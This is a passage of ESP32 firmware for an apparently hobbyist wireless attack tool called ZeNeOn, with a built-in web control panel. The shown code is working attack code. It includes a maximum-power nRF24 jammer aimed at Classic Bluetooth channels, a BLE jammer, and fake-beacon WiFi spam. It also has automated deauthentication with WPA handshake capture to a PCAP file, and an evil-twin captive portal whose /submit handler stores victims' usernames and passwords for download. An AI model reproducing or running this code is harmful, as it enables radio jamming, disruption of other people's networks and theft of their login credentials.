    btJamPktsSent++;
  }
}

/* ============ NRF24 CLASSIC BT JAMMER ============ */
#define NRF_CE  4
#define NRF_CSN 5
RF24 nrfRadio(NRF_CE, NRF_CSN);

// Classic BT uses 2402-2480 MHz = nRF24 channels 2-80
static const uint8_t BT_CHANNELS[] = {
  2, 4, 6, 8,10,12,14,16,18,20,22,24,26,28,30,32,34,36,38,40,
  42,44,46,48,50,52,54,56,58,60,62,64,66,68,70,72,74,76,78,80
};
static const int BT_CH_COUNT = sizeof(BT_CHANNELS);
static uint8_t nrfNoisePayload[32];

bool nrfJamInit() {
  SPI.begin(18, 19, 23, 5); // SCK, MISO, MOSI, SS
  if (!nrfRadio.begin()) {
    Serial.println("[NRF] Module not found! Check wiring.");
    addEvent("NRF24 not found — check wiring");
    nrfReady = false;
    return false;
  }
  nrfRadio.setAutoAck(false);
  nrfRadio.setPALevel(RF24_PA_MAX);
  nrfRadio.setDataRate(RF24_2MBPS);
  nrfRadio.setCRCLength(RF24_CRC_DISABLED);
  nrfRadio.setRetries(0, 0);
  nrfRadio.setPayloadSize(32);
  for (int i = 0; i < 32; i++) nrfNoisePayload[i] = (uint8_t)random(256);
  uint8_t addr[6] = {'J','A','M','N','R','F'};
  nrfRadio.openWritingPipe(addr);
  nrfRadio.stopListening();
  nrfReady = true;
  Serial.println("[NRF] Jammer initialized — 2Mbps MAX power");
  addEvent("NRF24 initialized — ready to jam");
  return true;
}

void sendNrfJamBurst() {
  if (!nrfReady) return;
  for (int i = 0; i < BT_CH_COUNT; i++) {
    nrfRadio.setChannel(BT_CHANNELS[i]);
    // Randomize payload each channel for wider spectral interference
    for (int j = 0; j < 32; j++) nrfNoisePayload[j] = (uint8_t)esp_random();
    nrfRadio.writeFast(nrfNoisePayload, 32, true);
    nrfJamPktsSent++;
  }
  nrfRadio.txStandBy();
}

void nrfJamDeinit() {
  nrfRadio.powerDown();
  nrfJamming = false;
  nrfReady = false;
  Serial.printf("[NRF] Jammer stopped: %u pkts\n", nrfJamPktsSent);
}

String nrfJamUI() {
  return header() + R"rawliteral(
<div class="card">
<h3>📻 Classic BT Jammer (nRF24)</h3>
<p style="margin-bottom:8px;opacity:0.7">Jam Classic Bluetooth (A2DP speakers, headphones) using nRF24L01 module</p>
<p style="margin-bottom:15px;font-size:12px;color:#ff9900">⚠ nRF24L01 must be wired: CE→GPIO4, CSN→GPIO5, SCK→18, MOSI→23, MISO→19, 3.3V+GND</p>
<div id="status" class="status hidden"></div>
<div class="grid">
<button onclick="startNrf(15)">15 Sec</button>
<button onclick="startNrf(30)">30 Sec</button>
<button onclick="startNrf(60)">60 Sec</button>
<button onclick="startNrf(120)">120 Sec</button>
</div>
<button class="danger" style="margin-top:15px" onclick="stopNrf()">⬛ Stop Jammer</button>
<div id="liveCard" class="card hidden" style="margin-top:15px">
<h3>Jammer Status</h3>
<div class="capture-quality">
<div class="cq-item"><div class="cq-val" id="nrfPkts">0</div><div class="cq-lbl">Packets Sent</div></div>
<div class="cq-item"><div class="cq-val" id="nrfTime">0s</div><div class="cq-lbl">Elapsed</div></div>
<div class="cq-item"><div class="cq-val" id="nrfRemain">0s</div><div class="cq-lbl">Remaining</div></div>
</div>
<div class="progress-outer"><div class="progress-inner" id="nrfProg" style="width:0%"></div></div>
<div id="nrfLog" style="margin-top:10px;background:#020408;border:1px solid rgba(255,100,0,0.4);border-radius:8px;padding:10px;height:120px;overflow-y:auto;font-size:12px;color:#ff9900"></div>
</div>
</div>
<button class="secondary" onclick="location.href='/'">← Back to Home</button>
<script>
var nrfPoll=null;
var startNrf=function(t){
  fetch('/nrfjam?time='+t).then(r=>r.text()).then(d=>{
    if(d.indexOf('not found')>=0){
      document.getElementById('status').className='status';
      document.getElementById('status').classList.remove('hidden');
      document.getElementById('status').innerHTML='❌ '+d;
      return;
    }
    document.getElementById('status').className='status';
    document.getElementById('status').classList.remove('hidden');
    document.getElementById('status').innerHTML='📻 Classic BT Jammer active for '+t+'s';
    document.getElementById('liveCard').classList.remove('hidden');
    addNrfLog('📻 nRF24 Jammer started ('+t+'s) — jamming 79 BT channels');
    startNrfPoll(t);
  });
}
var stopNrf=function(){
  if(nrfPoll) clearInterval(nrfPoll);
  fetch('/stopnrfjam').then(r=>r.text()).then(d=>{
    document.getElementById('status').className='status';
    document.getElementById('status').classList.remove('hidden');
    document.getElementById('status').innerHTML='Jammer stopped.';
    addNrfLog('⬛ Jammer stopped');
  });
}
var addNrfLog=function(msg){
  var el=document.getElementById('nrfLog');
  var d=document.createElement('div');
  d.textContent=msg; el.appendChild(d); el.scrollTop=el.scrollHeight;
}
var startNrfPoll=function(totalTime){
  var startT=Date.now();
  if(nrfPoll) clearInterval(nrfPoll);
  nrfPoll=setInterval(function(){
    fetch('/nrfjamstatus').then(r=>r.json()).then(d=>{
      document.getElementById('nrfPkts').textContent=d.pkts;
      var elapsed=Math.round((Date.now()-startT)/1000);
      document.getElementById('nrfTime').textContent=elapsed+'s';
      var remain=Math.max(0,totalTime-elapsed);
      document.getElementById('nrfRemain').textContent=remain+'s';
      var pct=Math.min(100,Math.round((elapsed/totalTime)*100));
      document.getElementById('nrfProg').style.width=pct+'%';
      if(!d.active){
        clearInterval(nrfPoll);
        document.getElementById('status').className='status success';
        document.getElementById('status').innerHTML='✓ Classic BT Jam complete — '+d.pkts+' packets sent across 79 channels';
        document.getElementById('nrfProg').style.width='100%';
        addNrfLog('✓ Jam complete: '+d.pkts+' packets sent');
      }
    }).catch(function(){});
  },800);
}
</script>
<div class="footer">Made by <a href="https://github.com/InoshMatheesha" target="_blank">MoOdY69</a> | ZeNeOn Framework v5.1</div>
</div></body></html>
)rawliteral";
}

/* ============ WIFI SPAM ============ */
void sendBeacon(const char *ssid, int ssidLen, int ch) {
  uint8_t packet[128] = {0};
  int pktLen = 0;
  packet[0] = 0x80;
  packet[1] = 0x00;
  packet[2] = 0x00;
  packet[3] = 0x00;
  memset(&packet[4], 0xFF, 6);
  packet[10] = 0x02 | (random(256) & 0xFE);
  for (int i = 11; i < 16; i++)
    packet[i] = random(256);
  memcpy(&packet[16], &packet[10], 6);
  packet[22] = 0;
  packet[23] = 0;
  unsigned long ts = micros();
  memcpy(&packet[24], &ts, 4);
  memset(&packet[28], 0, 4);
  packet[32] = 0x64;
  packet[33] = 0x00;
  packet[34] = 0x31;
  packet[35] = 0x04;
  pktLen = 36;
  packet[pktLen++] = 0x00;
  packet[pktLen++] = ssidLen;
  memcpy(&packet[pktLen], ssid, ssidLen);
  pktLen += ssidLen;
  packet[pktLen++] = 0x01;
  packet[pktLen++] = 0x08;
  uint8_t rates[] = {0x82, 0x84, 0x8B, 0x96, 0x24, 0x30, 0x48, 0x6C};
  memcpy(&packet[pktLen], rates, 8);
  pktLen += 8;
  packet[pktLen++] = 0x03;
  packet[pktLen++] = 0x01;
  packet[pktLen++] = ch;
  esp_wifi_80211_tx(WIFI_IF_STA, packet, pktLen, false);
}

void spamWiFi() {
  static const char *names[] = {
      "WuTangLAN",  "Obi_LAN",    "LAN_Solo",    "BatCave",    "Hogwarts",
      "StarkTower", "The_Shire",  "Matrix",      "SkyNet",     "Iron_LAN",
      "SpiderWeb",  "Yoda_Net",   "McFly",       "007_Net",    "Godzilla",
      "Pika_Net",   "Loading...", "Searching",   "Connect...", "404_Err",
      "Demo_Net",   "Test_Zone",  "Dial_Up",     "56k_Modem",  "Not_Yours",
      "Get_Own",    "No_Free",    "Go_Away",     "Keep_Out",   "Ask_Mom",
      "Pay_Me",     "Dont_Look",  "My_Precious", "Secret",     "Hidden",
      "Nope",       "Swipe_Left", "Try_Again",   "Locked",     "Private",
      "Nacho_Net",  "Taco_Tue",   "Pizza_Hut",   "Free_Beer",  "Send_Cash",
      "Virus_Free", "Buffering",  "Update_Req",  "Offline",    "Rebooting",
      "Slow_Net",   "Bad_Signal", "No_Internet", "Weak_Link"};
  int total = sizeof(names) / sizeof(names[0]);
  for (int i = 0; i < spamCount && i < total; i++) {
    sendBeacon(names[i], strlen(names[i]), random(1, 12));
  }
}

/* ============ RESTORE AP ============ */
void restoreMainAP() {
  esp_wifi_set_promiscuous(false);
  delay(50);
  WiFi.softAPdisconnect(true);
  delay(200);
  WiFi.mode(WIFI_AP_STA);
  WiFi.softAP("ZeNeOn", "12345678", 1); // Restore on channel 1
  delay(200);
  WiFi.softAPmacAddress(ownAPMAC);
  dnsServer.stop();
  dnsServer.start(DNS_PORT, "*", WiFi.softAPIP());
  evilTwinActive = false;
  Serial.printf("[+] Main AP restored: ZeNeOn CH1 | IP: %s\n",
                WiFi.softAPIP().toString().c_str());
}

/* ============ CAPTURE HELPERS ============ */
void startPcapCapture() {
  if (pcapFile) {
    pcapFile.flush();
    pcapFile.close();
  }
  if (SPIFFS.exists("/cap.pcap"))
    SPIFFS.remove("/cap.pcap");
  pcapFile = SPIFFS.open("/cap.pcap", FILE_WRITE);
  if (pcapFile) {
    pcap_hdr_t globalHeader;
    pcapFile.write((uint8_t *)&globalHeader, sizeof(globalHeader));
    pcapFile.flush();
    totalPacketsCaptured = 0;
    eapolFramesDetected = 0;
    eapolM1Count = 0;
    eapolM2Count = 0;
    eapolM3Count = 0;
    eapolM4Count = 0;
    handshakeCaptured = false;
    beaconCaptured = false;
    beaconCount = 0;
    authFrameCount = 0;
    assocFrameCount = 0;
    deauthCycles = 0;
    sniffing = true;
    capturingHandshake = true;
    Serial.println("[+] PCAP capture started");
  } else {
    Serial.println("[!] Failed to create PCAP file!");
  }
}

void stopCapture() {
  sniffing = false;
  capturingHandshake = false;
  deauthing = false;
  esp_wifi_set_promiscuous(false);
  delay(50);
  if (pcapFile) {
    pcapFile.flush();
    pcapFile.close();
  }
  Serial.println("\n════════════════════════════════════");
  Serial.println("  CAPTURE COMPLETE");
  Serial.println("════════════════════════════════════");
  Serial.printf("  Packets: %u\n", totalPacketsCaptured);
  Serial.printf("  Beacons: %s (%u)\n", beaconCaptured ? "YES" : "NO",
                beaconCount);
  Serial.printf("  Auth frames: %u\n", authFrameCount);
  Serial.printf("  Assoc frames: %u\n", assocFrameCount);
  Serial.printf("  EAPOL total: %u\n", eapolFramesDetected);
  Serial.printf("  M1: %u | M2: %u | M3: %u | M4: %u\n", eapolM1Count,
                eapolM2Count, eapolM3Count, eapolM4Count);
  Serial.printf("  Handshake: %s\n",
                handshakeCaptured ? "CAPTURED!" : "NOT captured");
  Serial.printf("  Deauth packets: %u\n", deauthPktsSent);
  Serial.printf("  Deauth cycles: %u\n", deauthCycles);
  Serial.println("════════════════════════════════════\n");
}

void enablePromiscuous() {
  esp_wifi_set_promiscuous(false);
  delay(50);
  // Force channel to target (SoftAP should already be on this channel)
  esp_wifi_set_channel(targetChannel, WIFI_SECOND_CHAN_NONE);
  delay(50);
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_rx_cb(promiscuousCallback);
  wifi_promiscuous_filter_t filter;
  filter.filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT |
                       WIFI_PROMIS_FILTER_MASK_DATA |
                       WIFI_PROMIS_FILTER_MASK_CTRL;
  esp_wifi_set_promiscuous_filter(&filter);
  delay(50);
  // Verify we're on the right channel
  uint8_t verifyCh;
  wifi_second_chan_t verifySc;
  esp_wifi_get_channel(&verifyCh, &verifySc);
  Serial.printf("[+] Promiscuous ON | Channel: %d (target: %d)\n", verifyCh,
                targetChannel);
  if (verifyCh != targetChannel) {
    Serial.println("[!] Channel mismatch! Retrying...");
    esp_wifi_set_promiscuous(false);
    delay(100);
    esp_wifi_set_channel(targetChannel, WIFI_SECOND_CHAN_NONE);
    delay(100);
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_rx_cb(promiscuousCallback);
    esp_wifi_set_promiscuous_filter(&filter);
  }
}

String getPhaseString() {
  switch (currentPhase) {
  case PHASE_PRE_CAPTURE:
    return "PRE_CAPTURE";
  case PHASE_DEAUTH_BURST:
    return "DEAUTH_BURST";
  case PHASE_LISTEN:
    return "LISTEN";
  case PHASE_DONE:
    return "DONE";
  default:
    return "IDLE";
  }
}

/* ============ ROUTES ============ */
void setupRoutes() {
  server.on("/", []() { server.send(200, "text/html", homeUI()); });
  server.on("/deauth", []() { server.send(200, "text/html", deauthUI()); });
  server.on("/evilui", []() { server.send(200, "text/html", evilUI()); });
  server.on("/spamui", []() { server.send(200, "text/html", spamUI()); });
  server.on("/btjamui", []() { server.send(200, "text/html", btJamUI()); });
  server.on("/nrfjamui", []() { server.send(200, "text/html", nrfJamUI()); });

  /* --- AJAX network scan (no page reload) --- */
  server.on("/scan", []() {
    int n = WiFi.scanNetworks(false, true);
    String json = "[";
    for (int i = 0; i < n; i++) {
      if (i > 0)
        json += ",";
      String ssid = WiFi.SSID(i);
      if (ssid.length() == 0)
        ssid = "Hidden Network";
      // Escape quotes in SSID
      ssid.replace("\"", "'");
      json += "{\"ssid\":\"" + ssid + "\",";
      json += "\"bssid\":\"" + WiFi.BSSIDstr(i) + "\",";
      json += "\"ch\":" + String(WiFi.channel(i)) + ",";
      json += "\"rssi\":" + String(WiFi.RSSI(i)) + "}";
    }
    json += "]";
    server.send(200, "application/json", json);
  });

  /* --- Event log for real-time terminal --- */
  server.on("/eventlog", []() {
    unsigned long sinceId = 0;
    if (server.hasArg("since"))
      sinceId = server.arg("since").toInt();
    String json = "{\"id\":" + String(eventLogId) + ",\"logs\":[";
    // Calculate how many new entries
    unsigned long newCount = eventLogId - sinceId;
    if (newCount > (unsigned long)eventLogCount)
      newCount = eventLogCount;
    if (newCount > EVENT_LOG_SIZE)
      newCount = EVENT_LOG_SIZE;
    bool first = true;
    int startIdx =
        (eventLogHead - (int)newCount + EVENT_LOG_SIZE) % EVENT_LOG_SIZE;
    for (unsigned long i = 0; i < newCount; i++) {
      int idx = (startIdx + (int)i) % EVENT_LOG_SIZE;
      if (!first)
        json += ",";
      // Escape special chars in log entry
      String entry = eventLog[idx];
      entry.replace("\"", "'");
      entry.replace("\\", "");
      json += "\"" + entry + "\"";
      first = false;
    }
    json += "]}";
    server.send(200, "application/json", json);
  });

  /* --- Target selection --- */
  server.on("/target", []() {
    targetSSID = server.arg("ssid");
    targetChannel = server.arg("ch").toInt();
    parseMac(server.arg("bssid"), targetBSSID);
    clientCount = 0;
    memset(clientMACs, 0, sizeof(clientMACs));

    // DON'T enable promiscuous here — channel change would disconnect the
    // web UI user before they can start the attack. Promiscuous + channel
    // change happens in /autoattack after the HTTP response is sent.

    deauthSeq = 0;
    deauthPktsSent = 0;
    Serial.printf("Target: %s CH:%d\n", targetSSID.c_str(), targetChannel);
    server.send(200, "text/plain", "Target locked: " + targetSSID);
  });

  server.on("/clients",
            []() { server.send(200, "text/plain", String(clientCount)); });
  server.on("/deauthstats",
            []() { server.send(200, "text/plain", String(deauthPktsSent)); });

  /* --- AUTOMATED ATTACK (phased: beacon capture → deauth → listen) --- */
  server.on("/autoattack", []() {
    if (targetBSSID[0] == 0 && targetBSSID[1] == 0 && targetBSSID[2] == 0 &&
        targetBSSID[3] == 0) {
      server.send(400, "text/plain", "No target selected");
      return;
    }
    if (memcmp(targetBSSID, ownAPMAC, 6) == 0) {
      server.send(400, "text/plain", "Cannot attack own AP!");
      return;
    }

    int t = server.arg("time").toInt();
    if (t < 10)
      t = 30;
    if (t > 300)
      t = 300;

    // *** CRITICAL: Send HTTP response BEFORE any WiFi changes ***
    // If we change channel first, the response never reaches the client
    server.send(200, "text/plain", "Auto attack started: " + String(t) + "s");
    delay(300); // Give TCP stack time to flush response to client

    // Stop any existing operations
    sniffing = false;
    deauthing = false;
    capturingHandshake = false;
    esp_wifi_set_promiscuous(false);
    delay(100);

    // *** KEY FIX: Restart SoftAP on TARGET channel ***
    // This keeps the web UI accessible while we capture on the target channel.
    // The user's device will briefly disconnect then auto-reconnect to same SSID.
    Serial.printf("[*] Restarting AP on target channel %d...\n", targetChannel);
    WiFi.softAPdisconnect(true);
    delay(200);
    WiFi.softAP("ZeNeOn", "12345678", targetChannel);
    delay(300);
    // Restart DNS so captive portal detection works on reconnect
    dnsServer.stop();
    dnsServer.start(DNS_PORT, "*", WiFi.softAPIP());
    Serial.printf("[+] AP restarted on CH %d | IP: %s\n", targetChannel,
                  WiFi.softAPIP().toString().c_str());

    // Configure WiFi for maximum performance
    esp_wifi_set_ps(WIFI_PS_NONE);
    esp_wifi_set_max_tx_power(84);
    wifi_country_t country = {.cc = "US",
                              .schan = 1,
                              .nchan = 13,
                              .policy = WIFI_COUNTRY_POLICY_AUTO};
    esp_wifi_set_country(&country);

    // Start PCAP capture (opens file, resets counters)
    startPcapCapture();

    // Enable promiscuous mode — AP is already on target channel
    enablePromiscuous();

    // Initialize phase system
    deauthPktsSent = 0;
    attackTotalDuration = (unsigned long)t * 1000UL;
    attackGlobalStart = millis();
    phaseStartTime = millis();
    currentPhase = PHASE_PRE_CAPTURE;
    lastDeauth = 0;

    addEvent("PHASE: Attack started on " + targetSSID + " (CH " +
             String(targetChannel) + ") for " + String(t) + "s");

    Serial.println("\n╔══════════════════════════════════════════╗");
    Serial.println("║  AUTO ATTACK + HANDSHAKE CAPTURE STARTED ║");
    Serial.println("╠══════════════════════════════════════════╣");
    Serial.printf("║  Target: %-32s║\n", targetSSID.c_str());
    Serial.printf("║  BSSID:  %02X:%02X:%02X:%02X:%02X:%02X              ║\n",
                  targetBSSID[0], targetBSSID[1], targetBSSID[2],
                  targetBSSID[3], targetBSSID[4], targetBSSID[5]);
    Serial.printf("║  Channel: %-2d  Duration: %-3ds             ║\n",
                  targetChannel, t);
    Serial.printf("║  Clients: %-2d                              ║\n",
                  clientCount);
    Serial.println("║  Phase 1: Capturing beacons...           ║");
    Serial.println("╚══════════════════════════════════════════╝\n");
  });

  /* --- Legacy manual attack (still works, now uses phases) --- */
  server.on("/attack", []() {
    if (targetBSSID[0] == 0 && targetBSSID[1] == 0 && targetBSSID[2] == 0 &&
        targetBSSID[3] == 0) {
      server.send(400, "text/plain", "No target selected");
      return;
    }
    if (memcmp(targetBSSID, ownAPMAC, 6) == 0) {
      server.send(400, "text/plain", "Cannot attack own AP!");
      return;
    }
    int t = server.arg("time").toInt();
    if (t < 1)
      t = 10;
    if (t > 120)
      t = 120;

    // Send response BEFORE WiFi changes
    server.send(200, "text/plain", "Attack started for " + String(t) + "s");
    delay(300);

    esp_wifi_set_promiscuous(false);
    delay(100);

    // Restart AP on target channel
    WiFi.softAPdisconnect(true);
    delay(200);
    WiFi.softAP("ZeNeOn", "12345678", targetChannel);
    delay(300);
    dnsServer.stop();
    dnsServer.start(DNS_PORT, "*", WiFi.softAPIP());

    esp_wifi_set_ps(WIFI_PS_NONE);
    esp_wifi_set_max_tx_power(84);
    wifi_country_t country = {.cc = "US",
                              .schan = 1,
                              .nchan = 13,
                              .policy = WIFI_COUNTRY_POLICY_AUTO};
    esp_wifi_set_country(&country);

    startPcapCapture();
    enablePromiscuous();

    deauthPktsSent = 0;
    attackTotalDuration = (unsigned long)t * 1000UL;
    attackGlobalStart = millis();
    phaseStartTime = millis();
    currentPhase = PHASE_PRE_CAPTURE;
    lastDeauth = 0;

    addEvent("PHASE: Legacy attack started (" + String(t) + "s)");
  });

  /* --- Capture status (JSON for UI polling) --- */
  server.on("/capturestatus", []() {
    String json = "{";
    json += "\"phase\":\"" + getPhaseString() + "\",";
    json += "\"m1\":" + String(eapolM1Count) + ",";
    json += "\"m2\":" + String(eapolM2Count) + ",";
    json += "\"m3\":" + String(eapolM3Count) + ",";
    json += "\"m4\":" + String(eapolM4Count) + ",";
    json += "\"eapol\":" + String(eapolFramesDetected) + ",";
    json +=
        "\"handshake\":" + String(handshakeCaptured ? "true" : "false") + ",";
    json += "\"beacons\":" + String(beaconCaptured ? "true" : "false") + ",";
    json += "\"beaconCount\":" + String(beaconCount) + ",";
    json += "\"authFrames\":" + String(authFrameCount) + ",";
    json += "\"assocFrames\":" + String(assocFrameCount) + ",";
    json += "\"packets\":" + String(totalPacketsCaptured) + ",";
    json += "\"clients\":" + String(clientCount) + ",";
    json += "\"deauthPkts\":" + String(deauthPktsSent) + ",";
    json += "\"cycles\":" + String(deauthCycles) + ",";
    unsigned long elapsed = 0;
    if (attackGlobalStart > 0 && currentPhase != PHASE_IDLE)
      elapsed = (millis() - attackGlobalStart) / 1000;
    json += "\"elapsed\":" + String(elapsed) + ",";
    json += "\"totalTime\":" + String(attackTotalDuration / 1000);
    json += "}";
    server.send(200, "application/json", json);
  });

  /* --- Manual sniff --- */
  server.on("/sniff", []() {
    if (sniffing) {
      server.send(200, "text/plain", "Already sniffing");
      return;
    }
    startPcapCapture();
    if (!pcapFile) {
      server.send(500, "text/plain", "Failed to create capture file");
      return;
    }
    // Send response before channel change
    server.send(200, "text/plain", "Capture started");
    delay(200);

    // Restart AP on target channel if a target is set
    if (targetChannel > 0 && targetBSSID[0] != 0) {
      WiFi.softAPdisconnect(true);
      delay(200);
      WiFi.softAP("ZeNeOn", "12345678", targetChannel);
      delay(200);
      dnsServer.stop();
      dnsServer.start(DNS_PORT, "*", WiFi.softAPIP());
    }
    enablePromiscuous();
    Serial.println("[*] Manual packet capture started");
  });

  /* --- Download PCAP --- */
  server.on("/download", []() {
    // Stop capture if still running
    if (sniffing || currentPhase != PHASE_IDLE) {
      stopCapture();
      currentPhase = PHASE_IDLE;
      delay(100);
    }
    if (!SPIFFS.exists("/cap.pcap")) {
      server.send(404, "text/plain", "No capture file. Run an attack first.");
      return;
    }
    File f = SPIFFS.open("/cap.pcap", FILE_READ);
    if (!f) {
      server.send(500, "text/plain", "Failed to open file");
      return;
    }
    String filename = "capture_" + String(millis() / 1000) + ".pcap";
    size_t fileSize = f.size();
    server.sendHeader("Content-Disposition",
                      "attachment; filename=" + filename);
    server.sendHeader("Content-Type", "application/vnd.tcpdump.pcap");
    server.sendHeader("Content-Length", String(fileSize));
    server.streamFile(f, "application/vnd.tcpdump.pcap");
    f.close();
    Serial.printf("[*] PCAP downloaded: %s (%u bytes)\n", filename.c_str(),
                  fileSize);
  });

  /* --- Evil Twin --- */
  server.on("/evil", []() {
    String ssid = server.arg("ssid");
    if (ssid.length() == 0) {
      server.send(400, "text/plain", "No SSID");
      return;
    }
    evilTwinSSID = ssid;
    portalTemplate = server.arg("tpl").toInt();
    if (portalTemplate < 0 || portalTemplate > 4) portalTemplate = 0;
    credentialsCount = 0;
    WiFi.softAPdisconnect(true);
    delay(100);
    WiFi.softAP(ssid.c_str());
    WiFi.softAPmacAddress(ownAPMAC);
    dnsServer.start(DNS_PORT, "*", WiFi.softAPIP());
    evilTwinActive = true;
    Serial.println("[!] Evil Twin: " + ssid);
    server.send(200, "text/plain", "Evil Twin started: " + ssid);
  });

  server.on("/submit", HTTP_POST, []() {
    String username = server.arg("username");
    String password = server.arg("password");
    if (username.length() > 0 && password.length() > 0) {
      credentialsCount++;
      Serial.println("\n=== CREDS CAPTURED ===");
      Serial.println("User: " + username);
      Serial.println("Pass: " + password);
      Serial.println("======================\n");
      File f = SPIFFS.open("/creds.txt", FILE_APPEND);
      if (f) {
        f.println("SSID: " + evilTwinSSID);
        f.println("User: " + username);
        f.println("Pass: " + password);
        f.println("---");
        f.close();
      }
    }
    server.send(200, "text/plain", "OK");
  });

  server.on("/getcreds", []() {
    if (!SPIFFS.exists("/creds.txt")) {
      server.send(404, "text/plain", "No credentials yet");
      return;
    }
    File f = SPIFFS.open("/creds.txt", FILE_READ);
    if (!f) {
      server.send(500, "text/plain", "Failed to open");
      return;
    }
    server.sendHeader("Content-Disposition",
                      "attachment; filename=credentials.txt");
    server.streamFile(f, "text/plain");
    f.close();
  });

  server.on("/stopevil", []() {
    if (evilTwinActive) {
      restoreMainAP();
      evilTwinSSID = "";
      server.send(200, "text/plain", "Evil Twin stopped.");
    } else
      server.send(200, "text/plain", "No evil twin active.");
  });

  server.on("/credstats",
            []() { server.send(200, "text/plain", String(credentialsCount)); });

  /* --- WiFi Spam --- */
  server.on("/spam", []() {
    int c = server.arg("count").toInt();
    if (c < 1)
      c = 10;
    if (c > 50)
      c = 50;
    spamCount = c;
    spamming = true;
    esp_wifi_set_promiscuous(true);
    Serial.println("[*] Spam started: " + String(c));
    server.send(200, "text/plain", "Spamming " + String(c) + " networks");
  });

  /* --- Bluetooth Jammer --- */
  server.on("/btjam", []() {
    int t = server.arg("time").toInt();
    if (t < 5) t = 15;
    if (t > 300) t = 300;
    btJamInit();
    if (!btInitialized) {
      server.send(500, "text/plain", "BT init failed");
      return;
    }
    btJamPktsSent = 0;
    btJamStartTime = millis();
    btJamEndTime = millis() + (unsigned long)t * 1000UL;
    btJamming = true;
    lastBtJam = 0;
    Serial.printf("[BT] Jammer started for %ds\n", t);
    addEvent("BT Jammer started for " + String(t) + "s");
    server.send(200, "text/plain", "BT Jam started: " + String(t) + "s");
  });

  server.on("/stopbtjam", []() {
    btJamming = false;
    if (btInitialized) {
      esp_ble_gap_stop_advertising();
      btJamDeinit();
    }
    Serial.printf("[BT] Jammer stopped: %u pkts\n", btJamPktsSent);
    addEvent("BT Jammer stopped: " + String(btJamPktsSent) + " pkts");
    server.send(200, "text/plain", "BT Jam stopped");
  });

  server.on("/btjamstatus", []() {
    String json = "{";
    json += "\"active\":" + String(btJamming ? "true" : "false") + ",";
    json += "\"pkts\":" + String(btJamPktsSent);
    json += "}";
    server.send(200, "application/json", json);
  });

  /* --- nRF24 Classic BT Jammer --- */
  server.on("/nrfjam", []() {
    int t = server.arg("time").toInt();
    if (t < 5) t = 15;
    if (t > 300) t = 300;
    if (!nrfJamInit()) {
      server.send(500, "text/plain", "nRF24 not found — check wiring (CE→GPIO4 CSN→GPIO5)");
      return;
    }
    nrfJamPktsSent = 0;
    nrfJamEndTime = millis() + (unsigned long)t * 1000UL;
    nrfJamming = true;
    lastNrfJam = 0;
    Serial.printf("[NRF] Classic BT Jammer started for %ds\n", t);
    addEvent("nRF24 Classic BT Jammer started for " + String(t) + "s");
    server.send(200, "text/plain", "nRF24 jam started: " + String(t) + "s");
  });

  server.on("/stopnrfjam", []() {
    nrfJamming = false;
    if (nrfReady) nrfJamDeinit();
    Serial.printf("[NRF] Jammer stopped: %u pkts\n", nrfJamPktsSent);
    addEvent("nRF24 Jammer stopped: " + String(nrfJamPktsSent) + " pkts");
    server.send(200, "text/plain", "nRF24 jam stopped");
  });

  server.on("/nrfjamstatus", []() {
    String json = "{";
    json += "\"active\":" + String(nrfJamming ? "true" : "false") + ",";
    json += "\"pkts\":" + String(nrfJamPktsSent);
    json += "}";
    server.send(200, "application/json", json);
  });

  /* --- Stop everything --- */
  server.on("/stop", []() {
    bool wasActive = sniffing || deauthing || spamming || btJamming || nrfJamming || capturingHandshake ||
                     currentPhase != PHASE_IDLE;
    if (btJamming) {
      btJamming = false;
      if (btInitialized) { esp_ble_gap_stop_advertising(); btJamDeinit(); }
    }
    if (nrfJamming) {
      nrfJamming = false;
      if (nrfReady) nrfJamDeinit();
    }
    bool wasAttacking = currentPhase != PHASE_IDLE;

    if (currentPhase != PHASE_IDLE) {
      stopCapture();
      currentPhase = PHASE_IDLE;
      attackGlobalStart = 0;
    } else {
      sniffing = false;
      deauthing = false;
      capturingHandshake = false;
      esp_wifi_set_promiscuous(false);
      delay(50);
      if (pcapFile) {
        pcapFile.flush();
        pcapFile.close();
      }
    }
    spamming = false;

    if (evilTwinActive)
      restoreMainAP();

    // Restore AP to channel 1 if we were attacking on a different channel
    if (wasAttacking) {
      WiFi.softAPdisconnect(true);
      delay(200);
      WiFi.softAP("ZeNeOn", "12345678", 1);
      delay(200);
      dnsServer.stop();
      dnsServer.start(DNS_PORT, "*", WiFi.softAPIP());
      addEvent("Stopped. AP restored on CH1.");
    }

    if (wasActive)
      Serial.printf("[*] Stopped. Pkts: %u | EAPOL: %u | Handshake: %s\n",
                    totalPacketsCaptured, eapolFramesDetected,
                    handshakeCaptured ? "YES" : "NO");
    server.send(200, "text/plain", "All operations stopped");
  });

  server.onNotFound([]() {
    if (evilTwinActive)
      server.send(200, "text/html", captivePortal());
    else
      server.send(200, "text/html", homeUI());
  });
}

/* ============ SETUP ============ */
void setup() {
  Serial.begin(115200);
  delay(500);
  Serial.println("\n====================================================");
  Serial.println("  ZeNeOn v5.1 — Automated Handshake Capture");
  Serial.println("  Made by MoOdY");
  Serial.println("====================================================\n");
  if (!SPIFFS.begin(true))
    Serial.println("[!] SPIFFS mount failed");
  else
    Serial.printf("[+] SPIFFS: %u/%u bytes used\n", SPIFFS.usedBytes(),
                  SPIFFS.totalBytes());
  WiFi.mode(WIFI_AP_STA);
  WiFi.softAP("ZeNeOn", "12345678");
  WiFi.softAPmacAddress(ownAPMAC);
  IPAddress apIP = WiFi.softAPIP();
  Serial.printf("[+] AP: ZeNeOn | IP: %s\n", apIP.toString().c_str());
  dnsServer.start(DNS_PORT, "*", apIP);

  esp_wifi_set_ps(WIFI_PS_NONE);
  esp_wifi_set_max_tx_power(84);
  wifi_country_t country = {
      .cc = "US", .schan = 1, .nchan = 13, .policy = WIFI_COUNTRY_POLICY_AUTO};
  esp_wifi_set_country(&country);

  // Don't enable promiscuous at startup — only when attack starts
  setupRoutes();
  server.begin();
  Serial.printf("[+] Web UI: http://%s\n", apIP.toString().c_str());
  Serial.println("[+] SYSTEM READY\n");
  randomSeed(esp_random());
}

/* ============ MAIN LOOP (PHASE STATE MACHINE) ============ */
void loop() {
  dnsServer.processNextRequest();
  server.handleClient();

  unsigned long now = millis();

  /* ---- AUTOMATED PHASED ATTACK ---- */
  switch (currentPhase) {

  case PHASE_PRE_CAPTURE: {
    // Phase 1: Just LISTEN — capture beacons, probe responses, discover clients
    // NO deauthing, NO TX — pure RX for clean beacon capture
    if (now - phaseStartTime >= PRE_CAPTURE_MS) {
